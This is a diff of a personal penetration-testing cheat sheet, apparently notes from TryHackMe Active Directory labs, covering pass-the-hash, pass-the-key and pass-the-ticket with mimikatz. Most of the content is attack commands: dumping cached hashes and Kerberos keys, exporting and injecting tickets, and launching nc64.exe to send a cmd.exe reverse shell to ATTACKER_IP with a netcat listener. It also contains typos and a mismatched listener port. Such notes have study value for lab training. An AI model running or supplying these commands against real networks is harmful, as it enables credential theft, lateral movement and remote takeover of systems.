@@ -216,21 +216,21 @@
     ### if the DC administrator login on a host. use mimikatz get the cached hash. apply TGT
         $mimikatz # sekurlas::pth /user:$Aministror /domain:inmy.com /ntlm <hash> /run:PowerShell.exe
       
-  ###AD
-    ####pass the hash
+  ### AD
+    #### pass the hash
       //use mimikatz load hash in the memory, and get the session of this user.
       mimikatz # privilege::debug
       mimikatz # token::elevate  //get the hash
       mimikatz # token::revert
       mimikatz # sekurlsa::pth /user:username /domain:DOmain /ntlm:hash /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555" //run cmd to get a reverseshell
       user@AttackBox$ nc -lvp 5555
-    ####pass the key
+    #### pass the key
       mimikatz # privilege::debug
       mimikatz # sekurlsa::ekeys  //to get the encrypted key
       mimikatz # sekurlsa::pth /user:username /domain:domain /rc4(or aes256 etc.):96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
       user@AttackBox$ nc -lvp 5555
       winrs.exe -r:THMIIS.za.tryhackme.com cmd  //use winrx to ssh to other host with the privi of this user(with hash)
-    ####pass the ticket
+    #### pass the ticket
       mimikatz # privilege::debug
       mimikatz # sekurlsa::tickets /export  //get all tickets on the host
       mimikatz # kerberos::ptt (after ppt is the path of ticekt saved)[0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi  //injecting ticket
